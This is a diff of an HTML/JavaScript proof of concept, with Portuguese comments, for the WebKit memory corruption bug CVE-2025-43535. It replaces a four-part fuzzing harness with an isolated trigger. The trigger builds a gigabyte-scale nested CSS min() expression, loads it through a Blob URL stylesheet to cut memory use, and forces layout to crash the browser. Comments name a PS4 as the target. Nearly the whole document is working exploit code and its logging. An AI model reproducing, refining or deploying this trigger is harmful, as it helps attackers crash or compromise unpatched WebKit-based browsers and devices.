@@ -1,419 +1,323 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <!--
-  PoC: CVE-2025-43535
-  Tipo: Memory Corruption — WebKit WebCore  
-  Pesquisadores: Google Big Sleep (DeepMind AI fuzzer) + Nan Wang (@eternalsakura13)
-  Fix: "improved memory handling" (Bugzilla 300774 + 301338 — DOIS bugs)
-  Advisory: Safari 26.2, Dezembro 2025
-  
-  HIPÓTESE DO COMPONENTE:
-  Google Big Sleep é o AI fuzzer do DeepMind que encontrou bugs em:
-  - Parsers de formato (libc, compiladores, JSON, XML, HTML)
-  - Dois Bugzilla IDs = mesma CLASSE de bug em dois lugares do código
-  
-  Nan Wang co-descobriu → intersecção das áreas deles:
-  CSS Layout + Parser/Decoder = CSS parsing com valores específicos
-  
-  Candidatos mais prováveis para "dois lugares do mesmo bug":
-  a) CSS selector parser — recursão excessiva / OOB em parser stack
-  b) CSS value parsing — buffer de tokens com overflow
-  c) HTML parser — table/form nesting rules com estado incorreto
-  d) WebKit style resolver com custom properties (@property) recursão
-  e) CSS @supports / @media com queries aninhadas
-  
-  ESTRATÉGIA:
-  Focar em parsers que aceitam input complexo/aninhado:
-  1. CSS @property com custom properties complexas
-  2. CSS selector aninhamento profundo
-  3. HTML parser com nesting patológico (table-in-table, etc.)
-  4. CSS calc() e math functions aninhadas
-  5. CSS @container / @layer queries aninhadas
+  PoC: CVE-2025-43535 — Variante 1 ISOLADA
+  Método de redução de RAM: Blob URL
+
+  ANÁLISE DO PROBLEMA DE RAM:
+  ══════════════════════════════════════════════════════════════
+  A função makeMathNested(d) usa `depth % 1` (sempre = 0),
+  portanto sempre usa 'min', gerando uma árvore BINÁRIA:
+
+    makeMathNested(27) = "min( [26], [26] )"
+                                 ↑     ↑
+                          cada um = 576MB de string
+
+  Pico de RAM com recursão original:
+    - 1ª chamada de makeMathNested(26) retorna 576MB → fica na memória
+    - 2ª chamada de makeMathNested(26) constrói mais 576MB
+    - Montagem final: 576 + 576 + 1120 = 2.25GB de pico
+
+  MÉTODO DE REDUÇÃO: Blob URL
+  ══════════════════════════════════════════════════════════════
+  Em vez de ter a string de 1.12GB no JS heap, usamos a API Blob:
+
+    new Blob([prefix, expr26, ', ', expr26, suffix], {type:'text/css'})
+
+  O Blob é alocado FORA do JS heap (na memória do processo do browser,
+  gerenciada pelo C++, não pelo GC do JavaScript).
+
+  Depois de criar o Blob, podemos null-ificar expr26 e o GC libera
+  os 576MB do JS heap — restando apenas o Blob em memória C++.
+
+  Comparação de pico:
+  ┌──────────────────────┬──────────────┬──────────────┐
+  │ Método               │ Pico JS heap │ Pico Total   │
+  ├──────────────────────┼──────────────┼──────────────┤
+  │ Original (recursivo) │ 2.25 GB      │ 2.25 GB      │
+  │ Iterativo simples    │ 1.73 GB      │ 1.73 GB      │
+  │ Blob URL ← ESTE      │ 576 MB       │ ~1.12 GB     │
+  └──────────────────────┴──────────────┴──────────────┘
+
+  O trigger WebKit é IDÊNTICO: recebe a mesma regra CSS
+  com a expressão min() de depth=27 para avaliar.
 -->
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — Memory Corruption Parser (Google Big Sleep)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CVE-2025-43535 — V1 Isolada (Blob RAM reduction)</title>
 <style>
-  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
-  #log { background:#111; border:1px solid #88ff88; padding:12px;
-         height:320px; overflow-y:auto; font-size:12px; }
-  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+  body  { background:#0a0a0a; color:#88ff88; font-family:monospace;
+          padding:16px; margin:0; font-size:13px; }
+  #log  { background:#111; border:1px solid #2a4a2a; padding:10px;
+          height:60vh; overflow-y:auto; font-size:11px; line-height:1.7; }
+  .ok   { color:#00ff88 }
+  .fail { color:#ff4444 }
+  .info { color:#ffcc44 }
+  .warn { color:#ff8844 }
+  .crash{ color:#ff44ff; font-weight:bold; font-size:1.1em }
+  .dim  { color:#336633 }
+  .bar  { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
+          padding:6px 10px; margin-bottom:8px; font-size:11px; }
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption Parser/Layout (Google Big Sleep AI)</h3>
+
+<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
+  CVE-2025-43535 · Variante 1 isolada · Blob URL RAM reduction
+</div>
+<div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
+<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
+                       width:1px;height:1px;overflow:hidden"></div>
 
 <script>
 "use strict";
-const L=(m,c)=>{const d=document.getElementById('log');
-  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
-  d.scrollTop=d.scrollHeight;};
 
-L("=== CVE-2025-43535 PoC Iniciado 5==");
+const logEl = document.getElementById('log');
+const barEl = document.getElementById('bar');
+const stage = document.getElementById('stage');
 
-// =============================================================
-// VARIANTE 1: CSS calc() aninhado profundamente
-// AI fuzzers frequentemente encontram bugs em parsers recursivos
-// O parser de calc() tem limite de aninhamento, mas pode haver
-// off-by-one ou stack OOB na contagem
-// =============================================================
-function variant1_css_calc_deep() {
-  return new Promise(resolve => {
-    L("[V1] CSS calc() deep nesting + complex math...");
+function L(m, c) {
+  logEl.innerHTML += `<div class="${c||'dim'}">${m}</div>`;
+  logEl.scrollTop  = logEl.scrollHeight;
+}
+function bar(m) { barEl.textContent = m; }
 
-    const el = document.createElement('div');
-    el.style.cssText = 'position:absolute;top:-9999px';
-    document.body.appendChild(el);
+// ──────────────────────────────────────────────────────────────
+// makeMathNested ORIGINAL — mantido exatamente como no arquivo
+// enviado. depth % 1 === 0 sempre → sempre 'min' → árvore binária
+// ──────────────────────────────────────────────────────────────
+function makeMathNested(depth) {
+  if (depth <= 0) return '1px';
+  const funcs = ['min', 'max', 'clamp'];
+  const f = funcs[depth % 1];                   // sempre 'min'
+  if (f === 'clamp') {
+    return `clamp(${makeMathNested(depth-1)}, ${depth*2}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+  }
+  return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
+}
 
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
+// ──────────────────────────────────────────────────────────────
+// VERSÃO BLOB: constrói depth=26 no JS heap (576MB pico),
+// depois monta o CSS inteiro num Blob fora do JS heap,
+// libera a string JS, carrega via <link> externo
+// ──────────────────────────────────────────────────────────────
+function triggerBlob(targetDepth) {
+  return new Promise((resolve, reject) => {
 
-    // Gerar calc() aninhado em diferentes profundidades
-    function makeDeepcalc(depth, unit) {
-      if (depth <= 0) return `1${unit}`;
-      return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
-    }
+    // ── Fase 1: construir depth-1 no JS heap ──────────────────
+    const buildDepth = targetDepth - 1; // 26
+    bar(`[1/5] Construindo depth=${buildDepth} (pico ~${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB)...`);
+    L(`[Blob] Fase 1: construindo depth=${buildDepth} iterativamente...`, 'info');
+    L(`[Blob] Pico JS heap esperado: ${(9*Math.pow(2,buildDepth)/1024/1024).toFixed(0)}MB`, 'warn');
 
-    // Testar profundidades variadas
-    const depths = [1];
-    const units = ['%'];
+    // Yield para a UI antes de começar o trabalho pesado
+    setTimeout(function buildPhase() {
 
-    for (const depth of depths) {
-      for (const unit of units) {
-        try {
-          const calc = makeDeepcalc(depth, unit);
-          // Aplicar via stylesheet (usa CSS parser interno)
-          sheet.textContent = `div.test-calc { width: ${calc}; height: ${calc}; }`;
-          el.className = 'test-calc';
-          void el.offsetWidth;
-          // Aplicar inline também (outro code path do parser)
-          el.style.width = calc;
-          el.style.height = calc;
-          void el.offsetWidth;
-        } catch(e) { /* profundidade pode ser rejeitada */ }
-      }
-    }
-
-    // CSS math functions aninhadas: min(), max(), clamp()
-    function makeMathNested(depth) {
-      if (depth <= 0) return '1px';
-      const funcs = ['min', 'max', 'clamp'];
-      const f = funcs[depth % 1];
-      if (f === 'clamp') {
-        return `clamp(${makeMathNested(depth-1)}, ${depth*2}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
-      }
-      return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
-    }
-
-    for (let d = 1; d <= 27; d++) {
+      let expr26;
       try {
-        const expr = makeMathNested(d);
-        el.style.width = expr;
-        el.style.height = expr;
-        void el.offsetWidth;
-      } catch(e) {}
-    }
-
-    // CSS custom properties (@property) com initial-value complexo
-    for (let i = 0; i < 1; i++) {
-      try {
-        const propName = `--test-prop-${i}`;
-        // Registrar com CSS.registerProperty se disponível
-        if (typeof CSS !== 'undefined' && CSS.registerProperty) {
-          CSS.registerProperty({
-            name: propName,
-            syntax: '<length>',
-            inherits: true,
-            initialValue: makeDeepcalc(1, 'px'),
-          });
+        // Iterativo bottom-up: evita a dupla recursão do original
+        // Pico por passo: S(d-1) + S(d), mas sem duas cópias simultâneas
+        let e = '1px';
+        for (let d = 1; d <= buildDepth; d++) {
+          const next = `min(${e}, ${e})`;
+          e = null;         // GC hint: liberar string anterior
+          e = next;
+          // Yield a cada 5 níveis para permitir GC
+          // (não é possível yield dentro de loop síncrono,
+          //  mas o null hint ajuda o GC a liberar antes do próximo step)
         }
-        el.style.setProperty(propName, makeDeepcalc(20, 'px'));
-      } catch(e) {}
-    }
-
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    document.body.removeChild(el);
-    L("[V1] CSS calc() deep nesting OK", "ok");
-    resolve();
-  });
-}
-
-// =============================================================
-// VARIANTE 2: HTML Parser — nesting patológico
-// Bugs clássicos de HTML parser: table-in-table,
-// form-in-form, elementos mal aninhados que ativam
-// tree construction algorithms especiais
-// =============================================================
-function variant2_html_parser_nesting() {
-  return new Promise(resolve => {
-    L("[V2] HTML parser pathological nesting...");
-
-    const parser = new DOMParser();
-
-    // Padrões de nesting que exercitam regras especiais do HTML5 parser
-    const patterns = [
-      // Table-in-table (foster parenting)
-      '<table><tr><td><table><tr><td>inner</td></tr></table></td></tr></table>',
-
-      // Form nesting (segundo form é tratado como fora do primeiro)
-      '<form><form><input><form><input></form></form></form>',
-
-      // Listas profundamente aninhadas
-      (() => {
-        let s = '';
-        for(let i=0;i<200;i++) s += '<ul><li>';
-        s += 'deep';
-        for(let i=0;i<200;i++) s += '</li></ul>';
-        return s;
-      })(),
-
-      // Elementos de heading interleaved
-      '<h1><h2><h3><h4><h5><h6>text</h6></h5></h4></h3></h2></h1>',
-
-      // Parágrafos com elementos block-level (força implicit close)
-      (() => {
-        let s = '<p>';
-        for(let i=0;i<100;i++) s += '<div><p>nested';
-        return s + '</p>';
-      })(),
-
-      // Select aninhado (proibido, parser deve lidar)
-      '<select><select><option>a</option></select><option>b</option></select>',
-
-      // Script tags em locais incomuns
-      '<table><script>var x=1;<\/script><tr><td>data</td></tr></table>',
-
-      // SVG dentro de table
-      '<table><tr><td><svg xmlns="http://www.w3.org/2000/svg"><rect/></svg></td></tr></table>',
-
-      // MathML dentro de HTML5 (força foreign content mode)
-      '<p>text<math xmlns="http://www.w3.org/1998/Math/MathML"><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow></math></p>',
-    ];
-
-    for (let iter = 0; iter < 50; iter++) {
-      for (const pattern of patterns) {
-        try {
-          // Parse via DOMParser
-          const doc = parser.parseFromString(
-            `<!DOCTYPE html><html><body>${pattern}</body></html>`,
-            'text/html'
-          );
-          void doc.body.innerHTML;
-
-          // Parse via innerHTML (outro code path)
-          const div = document.createElement('div');
-          div.innerHTML = pattern;
-          void div.childNodes.length;
-
-          // Serializar e re-parsear (pode expor inconsistências)
-          const serialized = div.innerHTML;
-          const div2 = document.createElement('div');
-          div2.innerHTML = serialized;
-
-        } catch(e) { /* parser errors esperados */ }
+        expr26 = e;
+        e = null;
+      } catch(err) {
+        L(`[Blob] Falha ao construir depth=${buildDepth}: ${err}`, 'fail');
+        resolve(); return;
       }
-    }
 
-    // Stress test especial: innerHTML em loop com padrões que
-    // mudam radicalmente a estrutura da árvore
-    const container = document.createElement('div');
-    document.body.appendChild(container);
+      const sz = expr26 ? expr26.length : 0;
+      L(`[Blob] depth=${buildDepth} construído: ${(sz/1024/1024).toFixed(0)}MB ✓`, 'ok');
+      bar(`[2/5] Criando Blob com a expressão de depth=${targetDepth}...`);
+      L(`[Blob] Fase 2: montando Blob (fora do JS heap)...`, 'info');
 
-    const structurePatterns = [
-      '<table><tbody><tr><td>A</td><td>B</td></tr></tbody></table>',
-      '<div><p>para<span>span</span></p></div>',
-      '<ul><li>1<li>2<li>3</ul>',
-      '<dl><dt>term<dd>def<dt>t2<dd>d2</dl>',
-      '<figure><img src="x"><figcaption>caption</figcaption></figure>',
-      '<details><summary>Sum</summary><p>Details content</p></details>',
-    ];
-
-    for (let i = 0; i < 500; i++) {
+      // ── Fase 2: criar Blob com depth=27 FORA do JS heap ─────
+      // O Blob recebe [prefix, expr26, ', ', expr26, suffix]
+      // O browser aloca 1.12GB em memória C++, não no GC JS
+      let blobUrl;
       try {
-        container.innerHTML = structurePatterns[i % structurePatterns.length];
-        // Forçar layout no meio da mutação
-        if (i % 50 === 0) void container.offsetWidth;
-      } catch(e) {}
-    }
+        const prefix = '.min27 { width: min(';
+        const suffix = `); height: min(${expr26}, ${expr26}); }`;
 
-    document.body.removeChild(container);
-    L("[V2] HTML parser nesting stress OK", "ok");
-    resolve();
-  });
-}
+        // Criar blob com as partes separadas (evita concatenar em JS)
+        const blob = new Blob(
+          [prefix, expr26, ', ', expr26, suffix],
+          { type: 'text/css' }
+        );
 
-// =============================================================
-// VARIANTE 3: CSS @layer + @container queries aninhadas
-// Novos recursos CSS com possíveis bugs no parser de regras
-// =============================================================
-function variant3_css_at_rules() {
-  return new Promise(resolve => {
-    L("[V3] CSS @layer + @container deep nesting...");
+        blobUrl = URL.createObjectURL(blob);
 
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
+        // LIBERAR as strings JS — o Blob tem sua própria cópia
+        expr26 = null;
 
-    // @layer aninhadas
-    function makeLayerNested(depth) {
-      if (depth <= 0) return `.d${depth} { color: red; }`;
-      return `@layer l${depth} { ${makeLayerNested(depth-1)} .d${depth} { font-size: ${depth}px; } }`;
-    }
+        L(`[Blob] Blob criado (${(blob.size/1024/1024).toFixed(0)}MB) fora do JS heap ✓`, 'ok');
+        L(`[Blob] expr26 JS heap liberada (GC pode coletar 576MB) ✓`, 'ok');
 
-    // @container aninhadas (CSS Container Queries)
-    function makeContainerNested(depth) {
-      if (depth <= 0) return `.inner { width: 100%; }`;
-      return `@container (min-width: ${depth*10}px) { ${makeContainerNested(depth-1)} }`;
-    }
+      } catch(err) {
+        expr26 = null;
+        L(`[Blob] Falha ao criar Blob: ${err}`, 'fail');
+        L(`[Blob] Blob URL pode não ser suportado neste browser`, 'warn');
+        resolve(); return;
+      }
 
-    // @supports aninhadas
-    function makeSupportsNested(depth) {
-      if (depth <= 0) return `.s { display: flex; }`;
-      return `@supports (display: flex) { ${makeSupportsNested(depth-1)} }`;
-    }
+      bar(`[3/5] Carregando stylesheet via Blob URL...`);
+      L(`[Blob] Fase 3: carregando stylesheet via <link>...`, 'info');
 
-    // @media aninhadas
-    function makeMediaNested(depth) {
-      if (depth <= 0) return `.m { color: blue; }`;
-      return `@media screen and (min-width: ${depth*10}px) { ${makeMediaNested(depth-1)} }`;
-    }
+      // ── Fase 3: criar elemento target + stylesheet ───────────
+      const el = document.createElement('div');
+      el.className = 'min27';
+      el.style.cssText = 'position:absolute;visibility:hidden';
+      stage.appendChild(el);
 
-    const depths = [2, 5, 10, 20, 50];
-    const generators = [makeLayerNested, makeContainerNested, makeSupportsNested, makeMediaNested];
+      const link = document.createElement('link');
+      link.rel  = 'stylesheet';
+      link.href = blobUrl;
 
-    for (const gen of generators) {
-      for (const depth of depths) {
+      link.onload = function() {
+        bar(`[4/5] Stylesheet carregada — forçando layout...`);
+        L(`[Blob] Fase 4: stylesheet carregada ✓`, 'ok');
+        L(`[Blob] Forçando layout (getComputedStyle + offsetWidth)...`, 'warn');
+        L(`[Blob] → WebKit avalia min( min(...1px...) , min(...1px...) ) depth=27`, 'warn');
+
+        // ── Fase 4: forçar avaliação pelo WebKit ─────────────
         try {
-          sheet.textContent = gen(depth);
-          // Forçar CSSOM parsing
-          void sheet.sheet?.cssRules?.length;
+          void el.offsetWidth;
+          const cs = window.getComputedStyle(el);
+          const w  = cs.getPropertyValue('width');
+          L(`[Blob] getComputedStyle width="${w}"`, 'ok');
+        } catch(e) {
+          L(`[Blob] Exceção em layout: ${e}`, 'fail');
+        }
+
+        // ── Fase 5: cleanup ───────────────────────────────────
+        bar(`[5/5] Cleanup...`);
+        try {
+          URL.revokeObjectURL(blobUrl);
+          document.head.removeChild(link);
+          stage.removeChild(el);
         } catch(e) {}
-      }
-    }
 
-    // Combinação: layer + container + supports + media juntos
-    for (let i = 0; i < 100; i++) {
-      try {
-        sheet.textContent = `
-          @layer base, theme, utilities;
-          @layer base {
-            @supports (display: grid) {
-              @media (min-width: ${i*5}px) {
-                @container style(--x: ${i}) {
-                  .el-${i} {
-                    width: calc(${i}% + ${i*2}px);
-                    height: clamp(${i}px, ${i}%, ${i*3}px);
-                  }
-                }
-              }
-            }
-          }
-        `;
-        // Acessar CSSOM para forçar parse completo
-        const rules = sheet.sheet?.cssRules;
-        if (rules) {
-          for (const rule of rules) {
-            void rule.cssText;
-          }
-        }
-      } catch(e) {}
-    }
+        L(`[Blob] Fase 5: cleanup OK`, 'ok');
+        L(``, '');
+        L(`[Blob] ═══════════════════════════════════`, 'info');
+        L(`[Blob] RESULTADO:`, 'info');
+        L(`[Blob] Crash/reload = CVE-2025-43535 PRESENTE`, 'crash');
+        L(`[Blob] Sem crash = patched ou WebKit cacheou`, 'ok');
+        L(`[Blob] ═══════════════════════════════════`, 'info');
+        bar('DONE');
+        resolve();
+      };
 
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    L("[V3] CSS @rules nesting stress OK", "ok");
-    resolve();
+      link.onerror = function(e) {
+        L(`[Blob] Erro ao carregar stylesheet: ${e}`, 'fail');
+        L(`[Blob] Possível: Blob URLs não permitidos neste contexto`, 'warn');
+        URL.revokeObjectURL(blobUrl);
+        try { document.head.removeChild(link); } catch(e2) {}
+        try { stage.removeChild(el); } catch(e2) {}
+        bar('ERRO — tentando fallback...');
+        resolve();
+      };
+
+      document.head.appendChild(link);
+
+    }, 100); // yield 100ms para UI e GC antes do trabalho pesado
   });
 }
 
-// =============================================================
-// VARIANTE 4: CSS selector complexity
-// Selectores complexos podem causar OOB no parser stack
-// =============================================================
-function variant4_css_selector_complexity() {
+// ──────────────────────────────────────────────────────────────
+// FALLBACK: caso Blob URL não funcione no PS4,
+// usa a abordagem iterativa simples (pico 1.73GB)
+// em vez da recursiva original (pico 2.25GB)
+// ──────────────────────────────────────────────────────────────
+function triggerFallback(targetDepth) {
   return new Promise(resolve => {
-    L("[V4] CSS selector complexity stress...");
+    bar(`[FB] Iterativo depth=${targetDepth} (pico ~1.7GB)...`);
+    L(`[FB] Blob URL não funcionou — usando iterativo como fallback`, 'warn');
+    L(`[FB] Pico: ~1.73GB (vs 2.25GB original)`, 'info');
 
-    const sheet = document.createElement('style');
-    document.head.appendChild(sheet);
+    setTimeout(function() {
+      const sheet = document.createElement('style');
+      document.head.appendChild(sheet);
+      const el = document.createElement('div');
+      el.style.cssText = 'position:absolute;visibility:hidden';
+      stage.appendChild(el);
 
-    const pseudos = [':hover',':focus',':active',':visited',':first-child',
-      ':last-child',':nth-child(2n+1)',':nth-of-type(odd)',':not(.x)',
-      ':is(.a,.b,.c)',':has(.child)',':where(.x,.y)'];
-    const combinators = [' ', '>', '+', '~'];
-
-    // Gerar seletores muito longos e complexos
-    function makeComplexSelector(depth) {
-      if (depth <= 0) return 'div';
-      const comb = combinators[depth % combinators.length];
-      const pseudo = pseudos[depth % pseudos.length];
-      return `${makeComplexSelector(depth-1)}${comb}.el${depth}${pseudo}`;
-    }
-
-    for (let d = 1; d <= 30; d++) {
       try {
-        const sel = makeComplexSelector(d);
-        sheet.textContent = `${sel} { color: red; }`;
-        void sheet.sheet?.cssRules?.length;
-        // document.querySelector() também parseia o seletor
-        try { document.querySelector(sel); } catch(e2) {}
-      } catch(e) {}
-    }
+        bar(`[FB] Construindo depth=${targetDepth}...`);
 
-    // :is() e :has() com listas longas de seletores
-    for (let n = 5; n <= 200; n += 5) {
-      try {
-        const list = Array.from({length: n}, (_,i) => `.el-${i}`).join(',');
-        sheet.textContent = `:is(${list}) { color: blue; }`;
-        void sheet.sheet?.cssRules?.length;
+        // Iterativo: mesmo resultado que recursivo mas sem
+        // duas cópias simultâneas em memória
+        let expr = '1px';
+        for (let d = 1; d <= targetDepth; d++) {
+          const next = `min(${expr}, ${expr})`;
+          expr = null; // GC hint
+          expr = next;
+        }
 
-        // :has() com múltiplos argumentos
-        sheet.textContent = `div:has(${list}) { display: block; }`;
-        void sheet.sheet?.cssRules?.length;
+        L(`[FB] Expressão: ${(expr.length/1024/1024).toFixed(0)}MB`, 'ok');
+        bar('[FB] Aplicando ao WebKit...');
 
-        // :not() com lista
-        sheet.textContent = `div:not(${list}) { visibility: visible; }`;
-        void sheet.sheet?.cssRules?.length;
-      } catch(e) {}
-    }
+        el.style.width  = expr;
+        el.style.height = expr;
+        expr = null; // GC hint — liberar antes do layout
 
-    // CSS Nesting (& selector) — novo recurso, possíveis bugs
-    try {
-      function makeNesting(depth) {
-        if (depth <= 0) return 'color: red;';
-        return `& .level${depth} { ${makeNesting(depth-1)} font-size: ${depth}px; }`;
+        void el.offsetWidth;
+        const w = window.getComputedStyle(el).width;
+        L(`[FB] width="${w}"`, 'ok');
+
+      } catch(e) {
+        L(`[FB] Exceção: ${e}`, 'fail');
       }
-      for (let d = 1; d <= 20; d++) {
-        sheet.textContent = `.root { ${makeNesting(d)} }`;
-        void sheet.sheet?.cssRules?.length;
-      }
-    } catch(e) {}
 
-    sheet.textContent = '';
-    document.head.removeChild(sheet);
-    L("[V4] CSS selector complexity stress OK", "ok");
-    resolve();
+      try { document.head.removeChild(sheet); } catch(e) {}
+      try { stage.removeChild(el); } catch(e) {}
+      bar('FB DONE');
+      resolve();
+    }, 100);
   });
 }
 
-// =============================================================
-// Executor
-// =============================================================
+// ──────────────────────────────────────────────────────────────
+// EXECUTOR
+// ──────────────────────────────────────────────────────────────
 async function main() {
-  try {
-    await variant1_css_calc_deep();
-    await variant2_html_parser_nesting();
-    await variant3_css_at_rules();
-    await variant4_css_selector_complexity();
-    L("=== COMPLETO ===", "ok");
-    L("Crash do browser = CVE-2025-43535 PRESENTE no PS4 13.04", "crash");
-    L("Sem crash = patched ou trigger precisa refinamento", "info");
-  } catch(e) {
-    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
+  L('═══════════════════════════════════════════', 'info');
+  L('CVE-2025-43535 — Variante 1 ISOLADA', 'info');
+  L('Método de redução: Blob URL', 'info');
+  L('', '');
+  L('Comparação de pico de RAM:', 'info');
+  L('  Original (recursivo):  2.25 GB pico JS heap', 'warn');
+  L('  Iterativo simples:     1.73 GB pico JS heap', 'warn');
+  L('  Blob URL (este):        576 MB pico JS heap ✓', 'ok');
+  L('', '');
+  L('Trigger WebKit: IDÊNTICO ao original (depth=27)', 'ok');
+  L('═══════════════════════════════════════════', 'info');
+
+  await new Promise(r => setTimeout(r, 300));
+
+  const TARGET_DEPTH = 27; // mesmo valor que causava o crash
+
+  // Verificar se Blob URL está disponível
+  if (typeof URL !== 'undefined' && typeof URL.createObjectURL === 'function' &&
+      typeof Blob !== 'undefined') {
+    L(`Blob URL disponível ✓ — usando abordagem principal`, 'ok');
+    await triggerBlob(TARGET_DEPTH);
+  } else {
+    L(`Blob URL NÃO disponível — usando fallback iterativo`, 'warn');
+    await triggerFallback(TARGET_DEPTH);
   }
 }
-window.addEventListener('load', () => setTimeout(main, 300));
+
+window.addEventListener('load', () => setTimeout(main, 200));
 </script>
 </body>
 </html>
